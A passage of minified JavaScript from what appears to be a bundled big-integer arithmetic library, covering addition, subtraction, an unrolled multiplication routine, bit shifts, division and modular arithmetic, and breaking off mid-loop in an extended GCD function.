R=0,j=0;j<M.length;j++)_=(C.words[j]|0)+(M.words[j]|0)+R,this.words[j]=_&67108863,R=_>>>26;for(;R!==0&&j<C.length;j++)_=(C.words[j]|0)+R,this.words[j]=_&67108863,R=_>>>26;if(this.length=C.length,R!==0)this.words[this.length]=R,this.length++;else if(C!==this)for(;j<C.length;j++)this.words[j]=C.words[j];return this},s.prototype.add=function(d){var _;return d.negative!==0&&this.negative===0?(d.negative=0,_=this.sub(d),d.negative^=1,_):d.negative===0&&this.negative!==0?(this.negative=0,_=d.sub(this),this.negative=1,_):this.length>d.length?this.clone().iadd(d):d.clone().iadd(this)},s.prototype.isub=function(d){if(d.negative!==0){d.negative=0;var _=this.iadd(d);return d.negative=1,_._normSign()}else if(this.negative!==0)return this.negative=0,this.iadd(d),this.negative=1,this._normSign();var C=this.cmp(d);if(C===0)return this.negative=0,this.length=1,this.words[0]=0,this;var M,R;C>0?(M=this,R=d):(M=d,R=this);for(var j=0,$=0;$<R.length;$++)_=(M.words[$]|0)-(R.words[$]|0)+j,j=_>>26,this.words[$]=_&67108863;for(;j!==0&&$<M.length;$++)_=(M.words[$]|0)+j,j=_>>26,this.words[$]=_&67108863;if(j===0&&$<M.length&&M!==this)for(;$<M.length;$++)this.words[$]=M.words[$];return this.length=Math.max(this.length,$),M!==this&&(this.negative=1),this._strip()},s.prototype.sub=function(d){return this.clone().isub(d)};function S(T,d,_){_.negative=d.negative^T.negative;var C=T.length+d.length|0;_.length=C,C=C-1|0;var M=T.words[0]|0,R=d.words[0]|0,j=M*R,$=j&67108863,D=j/67108864|0;_.words[0]=$;for(var y=1;y<C;y++){for(var V=D>>>26,oe=D&67108863,le=Math.min(y,d.length-1),he=Math.max(0,y-T.length+1);he<=le;he++){var ke=y-he|0;M=T.words[ke]|0,R=d.words[he]|0,j=M*R+oe,V+=j/67108864|0,oe=j&67108863}_.words[y]=oe|0,D=V|0}return D!==0?_.words[y]=D|0:_.length--,_._strip()}var b=function(d,_,C){var M=d.words,R=_.words,j=C.words,$=0,D,y,V,oe=M[0]|0,le=oe&8191,he=oe>>>13,ke=M[1]|0,Te=ke&8191,Ne=ke>>>13,gt=M[2]|0,je=gt&8191,Ue=gt>>>13,Pt=M[3]|0,We=Pt&8191,Ke=Pt>>>13,Di=M[4]|0,ot=Di&8191,vt=Di>>>13,Oi=M[5]|0,at=Oi&8191,Xe=Oi>>>13,on=M[6]|0,lt=on&8191,ct=on>>>13,wn=M[7]|0,ut=wn&8191,P=wn>>>13,g=M[8]|0,w=g&8191,F=g>>>13,G=M[9]|0,Z=G&8191,ee=G>>>13,Oe=R[0]|0,Pe=Oe&8191,Ce=Oe>>>13,mt=R[1]|0,xe=mt&8191,Lt=mt>>>13,cc=R[2]|0,Vt=cc&8191,_t=cc>>>13,Ea=R[3]|0,Dt=Ea&8191,pt=Ea>>>13,uc=R[4]|0,At=uc&8191,Ft=uc>>>13,ms=R[5]|0,zt=ms&8191,Ge=ms>>>13,hc=R[6]|0,Et=hc&8191,It=hc>>>13,vh=R[7]|0,Yt=vh&8191,yt=vh>>>13,_h=R[8]|0,Zt=_h&8191,bt=_h>>>13,fc=R[9]|0,Ot=fc&8191,xt=fc>>>13;C.negative=d.negative^_.negative,C.length=19,D=Math.imul(le,Pe),y=Math.imul(le,Ce),y=y+Math.imul(he,Pe)|0,V=Math.imul(he,Ce);var Or=($+D|0)+((y&8191)<<13)|0;$=(V+(y>>>13)|0)+(Or>>>26)|0,Or&=67108863,D=Math.imul(Te,Pe),y=Math.imul(Te,Ce),y=y+Math.imul(Ne,Pe)|0,V=Math.imul(Ne,Ce),D=D+Math.imul(le,xe)|0,y=y+Math.imul(le,Lt)|0,y=y+Math.imul(he,xe)|0,V=V+Math.imul(he,Lt)|0;var Ia=($+D|0)+((y&8191)<<13)|0;$=(V+(y>>>13)|0)+(Ia>>>26)|0,Ia&=67108863,D=Math.imul(je,Pe),y=Math.imul(je,Ce),y=y+Math.imul(Ue,Pe)|0,V=Math.imul(Ue,Ce),D=D+Math.imul(Te,xe)|0,y=y+Math.imul(Te,Lt)|0,y=y+Math.imul(Ne,xe)|0,V=V+Math.imul(Ne,Lt)|0,D=D+Math.imul(le,Vt)|0,y=y+Math.imul(le,_t)|0,y=y+Math.imul(he,Vt)|0,V=V+Math.imul(he,_t)|0;var Sa=($+D|0)+((y&8191)<<13)|0;$=(V+(y>>>13)|0)+(Sa>>>26)|0,Sa&=67108863,D=Math.imul(We,Pe),y=Math.imul(We,Ce),y=y+Math.imul(Ke,Pe)|0,V=Math.imul(Ke,Ce),D=D+Math.imul(je,xe)|0,y=y+Math.imul(je,Lt)|0,y=y+Math.imul(Ue,xe)|0,V=V+Math.imul(Ue,Lt)|0,D=D+Math.imul(Te,Vt)|0,y=y+Math.imul(Te,_t)|0,y=y+Math.imul(Ne,Vt)|0,V=V+Math.imul(Ne,_t)|0,D=D+Math.imul(le,Dt)|0,y=y+Math.imul(le,pt)|0,y=y+Math.imul(he,Dt)|0,V=V+Math.imul(he,pt)|0;var Io=($+D|0)+((y&8191)<<13)|0;$=(V+(y>>>13)|0)+(Io>>>26)|0,Io&=67108863,D=Math.imul(ot,Pe),y=Math.imul(ot,Ce),y=y+Math.imul(vt,Pe)|0,V=Math.imul(vt,Ce),D=D+Math.imul(We,xe)|0,y=y+Math.imul(We,Lt)|0,y=y+Math.imul(Ke,xe)|0,V=V+Math.imul(Ke,Lt)|0,D=D+Math.imul(je,Vt)|0,y=y+Math.imul(je,_t)|0,y=y+Math.imul(Ue,Vt)|0,V=V+Math.imul(Ue,_t)|0,D=D+Math.imul(Te,Dt)|0,y=y+Math.imul(Te,pt)|0,y=y+Math.imul(Ne,Dt)|0,V=V+Math.imul(Ne,pt)|0,D=D+Math.imul(le,At)|0,y=y+Math.imul(le,Ft)|0,y=y+Math.imul(he,At)|0,V=V+Math.imul(he,Ft)|0;var So=($+D|0)+((y&8191)<<13)|0;$=(V+(y>>>13)|0)+(So>>>26)|0,So&=67108863,D=Math.imul(at,Pe),y=Math.imul(at,Ce),y=y+Math.imul(Xe,Pe)|0,V=Math.imul(Xe,Ce),D=D+Math.imul(ot,xe)|0,y=y+Math.imul(ot,Lt)|0,y=y+Math.imul(vt,xe)|0,V=V+Math.imul(vt,Lt)|0,D=D+Math.imul(We,Vt)|0,y=y+Math.imul(We,_t)|0,y=y+Math.imul(Ke,Vt)|0,V=V+Math.imul(Ke,_t)|0,D=D+Math.imul(je,Dt)|0,y=y+Math.imul(je,pt)|0,y=y+Math.imul(Ue,Dt)|0,V=V+Math.imul(Ue,pt)|0,D=D+Math.imul(Te,At)|0,y=y+Math.imul(Te,Ft)|0,y=y+Math.imul(Ne,At)|0,V=V+Math.imul(Ne,Ft)|0,D=D+Math.imul(le,zt)|0,y=y+Math.imul(le,Ge)|0,y=y+Math.imul(he,zt)|0,V=V+Math.imul(he,Ge)|0;var Ta=($+D|0)+((y&8191)<<13)|0;$=(V+(y>>>13)|0)+(Ta>>>26)|0,Ta&=67108863,D=Math.imul(lt,Pe),y=Math.imul(lt,Ce),y=y+Math.imul(ct,Pe)|0,V=Math.imul(ct,Ce),D=D+Math.imul(at,xe)|0,y=y+Math.imul(at,Lt)|0,y=y+Math.imul(Xe,xe)|0,V=V+Math.imul(Xe,Lt)|0,D=D+Math.imul(ot,Vt)|0,y=y+Math.imul(ot,_t)|0,y=y+Math.imul(vt,Vt)|0,V=V+Math.imul(vt,_t)|0,D=D+Math.imul(We,Dt)|0,y=y+Math.imul(We,pt)|0,y=y+Math.imul(Ke,Dt)|0,V=V+Math.imul(Ke,pt)|0,D=D+Math.imul(je,At)|0,y=y+Math.imul(je,Ft)|0,y=y+Math.imul(Ue,At)|0,V=V+Math.imul(Ue,Ft)|0,D=D+Math.imul(Te,zt)|0,y=y+Math.imul(Te,Ge)|0,y=y+Math.imul(Ne,zt)|0,V=V+Math.imul(Ne,Ge)|0,D=D+Math.imul(le,Et)|0,y=y+Math.imul(le,It)|0,y=y+Math.imul(he,Et)|0,V=V+Math.imul(he,It)|0;var Aa=($+D|0)+((y&8191)<<13)|0;$=(V+(y>>>13)|0)+(Aa>>>26)|0,Aa&=67108863,D=Math.imul(ut,Pe),y=Math.imul(ut,Ce),y=y+Math.imul(P,Pe)|0,V=Math.imul(P,Ce),D=D+Math.imul(lt,xe)|0,y=y+Math.imul(lt,Lt)|0,y=y+Math.imul(ct,xe)|0,V=V+Math.imul(ct,Lt)|0,D=D+Math.imul(at,Vt)|0,y=y+Math.imul(at,_t)|0,y=y+Math.imul(Xe,Vt)|0,V=V+Math.imul(Xe,_t)|0,D=D+Math.imul(ot,Dt)|0,y=y+Math.imul(ot,pt)|0,y=y+Math.imul(vt,Dt)|0,V=V+Math.imul(vt,pt)|0,D=D+Math.imul(We,At)|0,y=y+Math.imul(We,Ft)|0,y=y+Math.imul(Ke,At)|0,V=V+Math.imul(Ke,Ft)|0,D=D+Math.imul(je,zt)|0,y=y+Math.imul(je,Ge)|0,y=y+Math.imul(Ue,zt)|0,V=V+Math.imul(Ue,Ge)|0,D=D+Math.imul(Te,Et)|0,y=y+Math.imul(Te,It)|0,y=y+Math.imul(Ne,Et)|0,V=V+Math.imul(Ne,It)|0,D=D+Math.imul(le,Yt)|0,y=y+Math.imul(le,yt)|0,y=y+Math.imul(he,Yt)|0,V=V+Math.imul(he,yt)|0;var dc=($+D|0)+((y&8191)<<13)|0;$=(V+(y>>>13)|0)+(dc>>>26)|0,dc&=67108863,D=Math.imul(w,Pe),y=Math.imul(w,Ce),y=y+Math.imul(F,Pe)|0,V=Math.imul(F,Ce),D=D+Math.imul(ut,xe)|0,y=y+Math.imul(ut,Lt)|0,y=y+Math.imul(P,xe)|0,V=V+Math.imul(P,Lt)|0,D=D+Math.imul(lt,Vt)|0,y=y+Math.imul(lt,_t)|0,y=y+Math.imul(ct,Vt)|0,V=V+Math.imul(ct,_t)|0,D=D+Math.imul(at,Dt)|0,y=y+Math.imul(at,pt)|0,y=y+Math.imul(Xe,Dt)|0,V=V+Math.imul(Xe,pt)|0,D=D+Math.imul(ot,At)|0,y=y+Math.imul(ot,Ft)|0,y=y+Math.imul(vt,At)|0,V=V+Math.imul(vt,Ft)|0,D=D+Math.imul(We,zt)|0,y=y+Math.imul(We,Ge)|0,y=y+Math.imul(Ke,zt)|0,V=V+Math.imul(Ke,Ge)|0,D=D+Math.imul(je,Et)|0,y=y+Math.imul(je,It)|0,y=y+Math.imul(Ue,Et)|0,V=V+Math.imul(Ue,It)|0,D=D+Math.imul(Te,Yt)|0,y=y+Math.imul(Te,yt)|0,y=y+Math.imul(Ne,Yt)|0,V=V+Math.imul(Ne,yt)|0,D=D+Math.imul(le,Zt)|0,y=y+Math.imul(le,bt)|0,y=y+Math.imul(he,Zt)|0,V=V+Math.imul(he,bt)|0;var ys=($+D|0)+((y&8191)<<13)|0;$=(V+(y>>>13)|0)+(ys>>>26)|0,ys&=67108863,D=Math.imul(Z,Pe),y=Math.imul(Z,Ce),y=y+Math.imul(ee,Pe)|0,V=Math.imul(ee,Ce),D=D+Math.imul(w,xe)|0,y=y+Math.imul(w,Lt)|0,y=y+Math.imul(F,xe)|0,V=V+Math.imul(F,Lt)|0,D=D+Math.imul(ut,Vt)|0,y=y+Math.imul(ut,_t)|0,y=y+Math.imul(P,Vt)|0,V=V+Math.imul(P,_t)|0,D=D+Math.imul(lt,Dt)|0,y=y+Math.imul(lt,pt)|0,y=y+Math.imul(ct,Dt)|0,V=V+Math.imul(ct,pt)|0,D=D+Math.imul(at,At)|0,y=y+Math.imul(at,Ft)|0,y=y+Math.imul(Xe,At)|0,V=V+Math.imul(Xe,Ft)|0,D=D+Math.imul(ot,zt)|0,y=y+Math.imul(ot,Ge)|0,y=y+Math.imul(vt,zt)|0,V=V+Math.imul(vt,Ge)|0,D=D+Math.imul(We,Et)|0,y=y+Math.imul(We,It)|0,y=y+Math.imul(Ke,Et)|0,V=V+Math.imul(Ke,It)|0,D=D+Math.imul(je,Yt)|0,y=y+Math.imul(je,yt)|0,y=y+Math.imul(Ue,Yt)|0,V=V+Math.imul(Ue,yt)|0,D=D+Math.imul(Te,Zt)|0,y=y+Math.imul(Te,bt)|0,y=y+Math.imul(Ne,Zt)|0,V=V+Math.imul(Ne,bt)|0,D=D+Math.imul(le,Ot)|0,y=y+Math.imul(le,xt)|0,y=y+Math.imul(he,Ot)|0,V=V+Math.imul(he,xt)|0;var ba=($+D|0)+((y&8191)<<13)|0;$=(V+(y>>>13)|0)+(ba>>>26)|0,ba&=67108863,D=Math.imul(Z,xe),y=Math.imul(Z,Lt),y=y+Math.imul(ee,xe)|0,V=Math.imul(ee,Lt),D=D+Math.imul(w,Vt)|0,y=y+Math.imul(w,_t)|0,y=y+Math.imul(F,Vt)|0,V=V+Math.imul(F,_t)|0,D=D+Math.imul(ut,Dt)|0,y=y+Math.imul(ut,pt)|0,y=y+Math.imul(P,Dt)|0,V=V+Math.imul(P,pt)|0,D=D+Math.imul(lt,At)|0,y=y+Math.imul(lt,Ft)|0,y=y+Math.imul(ct,At)|0,V=V+Math.imul(ct,Ft)|0,D=D+Math.imul(at,zt)|0,y=y+Math.imul(at,Ge)|0,y=y+Math.imul(Xe,zt)|0,V=V+Math.imul(Xe,Ge)|0,D=D+Math.imul(ot,Et)|0,y=y+Math.imul(ot,It)|0,y=y+Math.imul(vt,Et)|0,V=V+Math.imul(vt,It)|0,D=D+Math.imul(We,Yt)|0,y=y+Math.imul(We,yt)|0,y=y+Math.imul(Ke,Yt)|0,V=V+Math.imul(Ke,yt)|0,D=D+Math.imul(je,Zt)|0,y=y+Math.imul(je,bt)|0,y=y+Math.imul(Ue,Zt)|0,V=V+Math.imul(Ue,bt)|0,D=D+Math.imul(Te,Ot)|0,y=y+Math.imul(Te,xt)|0,y=y+Math.imul(Ne,Ot)|0,V=V+Math.imul(Ne,xt)|0;var To=($+D|0)+((y&8191)<<13)|0;$=(V+(y>>>13)|0)+(To>>>26)|0,To&=67108863,D=Math.imul(Z,Vt),y=Math.imul(Z,_t),y=y+Math.imul(ee,Vt)|0,V=Math.imul(ee,_t),D=D+Math.imul(w,Dt)|0,y=y+Math.imul(w,pt)|0,y=y+Math.imul(F,Dt)|0,V=V+Math.imul(F,pt)|0,D=D+Math.imul(ut,At)|0,y=y+Math.imul(ut,Ft)|0,y=y+Math.imul(P,At)|0,V=V+Math.imul(P,Ft)|0,D=D+Math.imul(lt,zt)|0,y=y+Math.imul(lt,Ge)|0,y=y+Math.imul(ct,zt)|0,V=V+Math.imul(ct,Ge)|0,D=D+Math.imul(at,Et)|0,y=y+Math.imul(at,It)|0,y=y+Math.imul(Xe,Et)|0,V=V+Math.imul(Xe,It)|0,D=D+Math.imul(ot,Yt)|0,y=y+Math.imul(ot,yt)|0,y=y+Math.imul(vt,Yt)|0,V=V+Math.imul(vt,yt)|0,D=D+Math.imul(We,Zt)|0,y=y+Math.imul(We,bt)|0,y=y+Math.imul(Ke,Zt)|0,V=V+Math.imul(Ke,bt)|0,D=D+Math.imul(je,Ot)|0,y=y+Math.imul(je,xt)|0,y=y+Math.imul(Ue,Ot)|0,V=V+Math.imul(Ue,xt)|0;var Bi=($+D|0)+((y&8191)<<13)|0;$=(V+(y>>>13)|0)+(Bi>>>26)|0,Bi&=67108863,D=Math.imul(Z,Dt),y=Math.imul(Z,pt),y=y+Math.imul(ee,Dt)|0,V=Math.imul(ee,pt),D=D+Math.imul(w,At)|0,y=y+Math.imul(w,Ft)|0,y=y+Math.imul(F,At)|0,V=V+Math.imul(F,Ft)|0,D=D+Math.imul(ut,zt)|0,y=y+Math.imul(ut,Ge)|0,y=y+Math.imul(P,zt)|0,V=V+Math.imul(P,Ge)|0,D=D+Math.imul(lt,Et)|0,y=y+Math.imul(lt,It)|0,y=y+Math.imul(ct,Et)|0,V=V+Math.imul(ct,It)|0,D=D+Math.imul(at,Yt)|0,y=y+Math.imul(at,yt)|0,y=y+Math.imul(Xe,Yt)|0,V=V+Math.imul(Xe,yt)|0,D=D+Math.imul(ot,Zt)|0,y=y+Math.imul(ot,bt)|0,y=y+Math.imul(vt,Zt)|0,V=V+Math.imul(vt,bt)|0,D=D+Math.imul(We,Ot)|0,y=y+Math.imul(We,xt)|0,y=y+Math.imul(Ke,Ot)|0,V=V+Math.imul(Ke,xt)|0;var Qr=($+D|0)+((y&8191)<<13)|0;$=(V+(y>>>13)|0)+(Qr>>>26)|0,Qr&=67108863,D=Math.imul(Z,At),y=Math.imul(Z,Ft),y=y+Math.imul(ee,At)|0,V=Math.imul(ee,Ft),D=D+Math.imul(w,zt)|0,y=y+Math.imul(w,Ge)|0,y=y+Math.imul(F,zt)|0,V=V+Math.imul(F,Ge)|0,D=D+Math.imul(ut,Et)|0,y=y+Math.imul(ut,It)|0,y=y+Math.imul(P,Et)|0,V=V+Math.imul(P,It)|0,D=D+Math.imul(lt,Yt)|0,y=y+Math.imul(lt,yt)|0,y=y+Math.imul(ct,Yt)|0,V=V+Math.imul(ct,yt)|0,D=D+Math.imul(at,Zt)|0,y=y+Math.imul(at,bt)|0,y=y+Math.imul(Xe,Zt)|0,V=V+Math.imul(Xe,bt)|0,D=D+Math.imul(ot,Ot)|0,y=y+Math.imul(ot,xt)|0,y=y+Math.imul(vt,Ot)|0,V=V+Math.imul(vt,xt)|0;var Ao=($+D|0)+((y&8191)<<13)|0;$=(V+(y>>>13)|0)+(Ao>>>26)|0,Ao&=67108863,D=Math.imul(Z,zt),y=Math.imul(Z,Ge),y=y+Math.imul(ee,zt)|0,V=Math.imul(ee,Ge),D=D+Math.imul(w,Et)|0,y=y+Math.imul(w,It)|0,y=y+Math.imul(F,Et)|0,V=V+Math.imul(F,It)|0,D=D+Math.imul(ut,Yt)|0,y=y+Math.imul(ut,yt)|0,y=y+Math.imul(P,Yt)|0,V=V+Math.imul(P,yt)|0,D=D+Math.imul(lt,Zt)|0,y=y+Math.imul(lt,bt)|0,y=y+Math.imul(ct,Zt)|0,V=V+Math.imul(ct,bt)|0,D=D+Math.imul(at,Ot)|0,y=y+Math.imul(at,xt)|0,y=y+Math.imul(Xe,Ot)|0,V=V+Math.imul(Xe,xt)|0;var pc=($+D|0)+((y&8191)<<13)|0;$=(V+(y>>>13)|0)+(pc>>>26)|0,pc&=67108863,D=Math.imul(Z,Et),y=Math.imul(Z,It),y=y+Math.imul(ee,Et)|0,V=Math.imul(ee,It),D=D+Math.imul(w,Yt)|0,y=y+Math.imul(w,yt)|0,y=y+Math.imul(F,Yt)|0,V=V+Math.imul(F,yt)|0,D=D+Math.imul(ut,Zt)|0,y=y+Math.imul(ut,bt)|0,y=y+Math.imul(P,Zt)|0,V=V+Math.imul(P,bt)|0,D=D+Math.imul(lt,Ot)|0,y=y+Math.imul(lt,xt)|0,y=y+Math.imul(ct,Ot)|0,V=V+Math.imul(ct,xt)|0;var xa=($+D|0)+((y&8191)<<13)|0;$=(V+(y>>>13)|0)+(xa>>>26)|0,xa&=67108863,D=Math.imul(Z,Yt),y=Math.imul(Z,yt),y=y+Math.imul(ee,Yt)|0,V=Math.imul(ee,yt),D=D+Math.imul(w,Zt)|0,y=y+Math.imul(w,bt)|0,y=y+Math.imul(F,Zt)|0,V=V+Math.imul(F,bt)|0,D=D+Math.imul(ut,Ot)|0,y=y+Math.imul(ut,xt)|0,y=y+Math.imul(P,Ot)|0,V=V+Math.imul(P,xt)|0;var ka=($+D|0)+((y&8191)<<13)|0;$=(V+(y>>>13)|0)+(ka>>>26)|0,ka&=67108863,D=Math.imul(Z,Zt),y=Math.imul(Z,bt),y=y+Math.imul(ee,Zt)|0,V=Math.imul(ee,bt),D=D+Math.imul(w,Ot)|0,y=y+Math.imul(w,xt)|0,y=y+Math.imul(F,Ot)|0,V=V+Math.imul(F,xt)|0;var Ca=($+D|0)+((y&8191)<<13)|0;$=(V+(y>>>13)|0)+(Ca>>>26)|0,Ca&=67108863,D=Math.imul(Z,Ot),y=Math.imul(Z,xt),y=y+Math.imul(ee,Ot)|0,V=Math.imul(ee,xt);var bo=($+D|0)+((y&8191)<<13)|0;return $=(V+(y>>>13)|0)+(bo>>>26)|0,bo&=67108863,j[0]=Or,j[1]=Ia,j[2]=Sa,j[3]=Io,j[4]=So,j[5]=Ta,j[6]=Aa,j[7]=dc,j[8]=ys,j[9]=ba,j[10]=To,j[11]=Bi,j[12]=Qr,j[13]=Ao,j[14]=pc,j[15]=xa,j[16]=ka,j[17]=Ca,j[18]=bo,$!==0&&(j[19]=$,C.length++),C};Math.imul||(b=S);function E(T,d,_){_.negative=d.negative^T.negative,_.length=T.length+d.length;for(var C=0,M=0,R=0;R<_.length-1;R++){var j=M;M=0;for(var $=C&67108863,D=Math.min(R,d.length-1),y=Math.max(0,R-T.length+1);y<=D;y++){var V=R-y,oe=T.words[V]|0,le=d.words[y]|0,he=oe*le,ke=he&67108863;j=j+(he/67108864|0)|0,ke=ke+$|0,$=ke&67108863,j=j+(ke>>>26)|0,M+=j>>>26,j&=67108863}_.words[R]=$,C=j,j=M}return C!==0?_.words[R]=C:_.length--,_._strip()}function U(T,d,_){return E(T,d,_)}s.prototype.mulTo=function(d,_){var C,M=this.length+d.length;return this.length===10&&d.length===10?C=b(this,d,_):M<63?C=S(this,d,_):M<1024?C=E(this,d,_):C=U(this,d,_),C},s.prototype.mul=function(d){var _=new s(null);return _.words=new Array(this.length+d.length),this.mulTo(d,_)},s.prototype.mulf=function(d){var _=new s(null);return _.words=new Array(this.length+d.length),U(this,d,_)},s.prototype.imul=function(d){return this.clone().mulTo(d,this)},s.prototype.imuln=function(d){var _=d<0;_&&(d=-d),r(typeof d=="number"),r(d<67108864);for(var C=0,M=0;M<this.length;M++){var R=(this.words[M]|0)*d,j=(R&67108863)+(C&67108863);C>>=26,C+=R/67108864|0,C+=j>>>26,this.words[M]=j&67108863}return C!==0&&(this.words[M]=C,this.length++),_?this.ineg():this},s.prototype.muln=function(d){return this.clone().imuln(d)},s.prototype.sqr=function(){return this.mul(this)},s.prototype.isqr=function(){return this.imul(this.clone())},s.prototype.pow=function(d){var _=I(d);if(_.length===0)return new s(1);for(var C=this,M=0;M<_.length&&_[M]===0;M++,C=C.sqr());if(++M<_.length)for(var R=C.sqr();M<_.length;M++,R=R.sqr())_[M]!==0&&(C=C.mul(R));return C},s.prototype.iushln=function(d){r(typeof d=="number"&&d>=0);var _=d%26,C=(d-_)/26,M=67108863>>>26-_<<26-_,R;if(_!==0){var j=0;for(R=0;R<this.length;R++){var $=this.words[R]&M,D=(this.words[R]|0)-$<<_;this.words[R]=D|j,j=$>>>26-_}j&&(this.words[R]=j,this.length++)}if(C!==0){for(R=this.length-1;R>=0;R--)this.words[R+C]=this.words[R];for(R=0;R<C;R++)this.words[R]=0;this.length+=C}return this._strip()},s.prototype.ishln=function(d){return r(this.negative===0),this.iushln(d)},s.prototype.iushrn=function(d,_,C){r(typeof d=="number"&&d>=0);var M;_?M=(_-_%26)/26:M=0;var R=d%26,j=Math.min((d-R)/26,this.length),$=67108863^67108863>>>R<<R,D=C;if(M-=j,M=Math.max(0,M),D){for(var y=0;y<j;y++)D.words[y]=this.words[y];D.length=j}if(j!==0)if(this.length>j)for(this.length-=j,y=0;y<this.length;y++)this.words[y]=this.words[y+j];else this.words[0]=0,this.length=1;var V=0;for(y=this.length-1;y>=0&&(V!==0||y>=M);y--){var oe=this.words[y]|0;this.words[y]=V<<26-R|oe>>>R,V=oe&$}return D&&V!==0&&(D.words[D.length++]=V),this.length===0&&(this.words[0]=0,this.length=1),this._strip()},s.prototype.ishrn=function(d,_,C){return r(this.negative===0),this.iushrn(d,_,C)},s.prototype.shln=function(d){return this.clone().ishln(d)},s.prototype.ushln=function(d){return this.clone().iushln(d)},s.prototype.shrn=function(d){return this.clone().ishrn(d)},s.prototype.ushrn=function(d){return this.clone().iushrn(d)},s.prototype.testn=function(d){r(typeof d=="number"&&d>=0);var _=d%26,C=(d-_)/26,M=1<<_;if(this.length<=C)return!1;var R=this.words[C];return!!(R&M)},s.prototype.imaskn=function(d){r(typeof d=="number"&&d>=0);var _=d%26,C=(d-_)/26;if(r(this.negative===0,"imaskn works only with positive numbers"),this.length<=C)return this;if(_!==0&&C++,this.length=Math.min(C,this.length),_!==0){var M=67108863^67108863>>>_<<_;this.words[this.length-1]&=M}return this._strip()},s.prototype.maskn=function(d){return this.clone().imaskn(d)},s.prototype.iaddn=function(d){return r(typeof d=="number"),r(d<67108864),d<0?this.isubn(-d):this.negative!==0?this.length===1&&(this.words[0]|0)<=d?(this.words[0]=d-(this.words[0]|0),this.negative=0,this):(this.negative=0,this.isubn(d),this.negative=1,this):this._iaddn(d)},s.prototype._iaddn=function(d){this.words[0]+=d;for(var _=0;_<this.length&&this.words[_]>=67108864;_++)this.words[_]-=67108864,_===this.length-1?this.words[_+1]=1:this.words[_+1]++;return this.length=Math.max(this.length,_+1),this},s.prototype.isubn=function(d){if(r(typeof d=="number"),r(d<67108864),d<0)return this.iaddn(-d);if(this.negative!==0)return this.negative=0,this.iaddn(d),this.negative=1,this;if(this.words[0]-=d,this.length===1&&this.words[0]<0)this.words[0]=-this.words[0],this.negative=1;else for(var _=0;_<this.length&&this.words[_]<0;_++)this.words[_]+=67108864,this.words[_+1]-=1;return this._strip()},s.prototype.addn=function(d){return this.clone().iaddn(d)},s.prototype.subn=function(d){return this.clone().isubn(d)},s.prototype.iabs=function(){return this.negative=0,this},s.prototype.abs=function(){return this.clone().iabs()},s.prototype._ishlnsubmul=function(d,_,C){var M=d.length+C,R;this._expand(M);var j,$=0;for(R=0;R<d.length;R++){j=(this.words[R+C]|0)+$;var D=(d.words[R]|0)*_;j-=D&67108863,$=(j>>26)-(D/67108864|0),this.words[R+C]=j&67108863}for(;R<this.length-C;R++)j=(this.words[R+C]|0)+$,$=j>>26,this.words[R+C]=j&67108863;if($===0)return this._strip();for(r($===-1),$=0,R=0;R<this.length;R++)j=-(this.words[R]|0)+$,$=j>>26,this.words[R]=j&67108863;return this.negative=1,this._strip()},s.prototype._wordDiv=function(d,_){var C=this.length-d.length,M=this.clone(),R=d,j=R.words[R.length-1]|0,$=this._countBits(j);C=26-$,C!==0&&(R=R.ushln(C),M.iushln(C),j=R.words[R.length-1]|0);var D=M.length-R.length,y;if(_!=="mod"){y=new s(null),y.length=D+1,y.words=new Array(y.length);for(var V=0;V<y.length;V++)y.words[V]=0}var oe=M.clone()._ishlnsubmul(R,1,D);oe.negative===0&&(M=oe,y&&(y.words[D]=1));for(var le=D-1;le>=0;le--){var he=(M.words[R.length+le]|0)*67108864+(M.words[R.length+le-1]|0);for(he=Math.min(he/j|0,67108863),M._ishlnsubmul(R,he,le);M.negative!==0;)he--,M.negative=0,M._ishlnsubmul(R,1,le),M.isZero()||(M.negative^=1);y&&(y.words[le]=he)}return y&&y._strip(),M._strip(),_!=="div"&&C!==0&&M.iushrn(C),{div:y||null,mod:M}},s.prototype.divmod=function(d,_,C){if(r(!d.isZero()),this.isZero())return{div:new s(0),mod:new s(0)};var M,R,j;return this.negative!==0&&d.negative===0?(j=this.neg().divmod(d,_),_!=="mod"&&(M=j.div.neg()),_!=="div"&&(R=j.mod.neg(),C&&R.negative!==0&&R.iadd(d)),{div:M,mod:R}):this.negative===0&&d.negative!==0?(j=this.divmod(d.neg(),_),_!=="mod"&&(M=j.div.neg()),{div:M,mod:j.mod}):this.negative&d.negative?(j=this.neg().divmod(d.neg(),_),_!=="div"&&(R=j.mod.neg(),C&&R.negative!==0&&R.isub(d)),{div:j.div,mod:R}):d.length>this.length||this.cmp(d)<0?{div:new s(0),mod:this}:d.length===1?_==="div"?{div:this.divn(d.words[0]),mod:null}:_==="mod"?{div:null,mod:new s(this.modrn(d.words[0]))}:{div:this.divn(d.words[0]),mod:new s(this.modrn(d.words[0]))}:this._wordDiv(d,_)},s.prototype.div=function(d){return this.divmod(d,"div",!1).div},s.prototype.mod=function(d){return this.divmod(d,"mod",!1).mod},s.prototype.umod=function(d){return this.divmod(d,"mod",!0).mod},s.prototype.divRound=function(d){var _=this.divmod(d);if(_.mod.isZero())return _.div;var C=_.div.negative!==0?_.mod.isub(d):_.mod,M=d.ushrn(1),R=d.andln(1),j=C.cmp(M);return j<0||R===1&&j===0?_.div:_.div.negative!==0?_.div.isubn(1):_.div.iaddn(1)},s.prototype.modrn=function(d){var _=d<0;_&&(d=-d),r(d<=67108863);for(var C=(1<<26)%d,M=0,R=this.length-1;R>=0;R--)M=(C*M+(this.words[R]|0))%d;return _?-M:M},s.prototype.modn=function(d){return this.modrn(d)},s.prototype.idivn=function(d){var _=d<0;_&&(d=-d),r(d<=67108863);for(var C=0,M=this.length-1;M>=0;M--){var R=(this.words[M]|0)+C*67108864;this.words[M]=R/d|0,C=R%d}return this._strip(),_?this.ineg():this},s.prototype.divn=function(d){return this.clone().idivn(d)},s.prototype.egcd=function(d){r(d.negative===0),r(!d.isZero());var _=this,C=d.clone();_.negative!==0?_=_.umod(d):_=_.clone();for(var M=new s(1),R=new s(0),j=new s(0),$=new s(1),D=0;_.isEven()&&C.isEven();)_.iushrn(1),C.iushrn(1),++D;for(var y=C.clone(),V=_.clone();!_.isZero();){for(var oe=0,le=1;!(_.words[0]&le)&&oe<26;++oe,le<<=1);if(oe>0)for(_.iushrn(oe);oe-- >0;)(M.isOdd()||R.isOdd())&&(M.iadd(y),R.isub(V)),M.iushrn(1),R.iushrn(1);for(var he=0,ke=1;!(C.words[0]&ke)&&he<26;++he,ke<<=1);if(he>0)for(C.iushrn(he);he-- 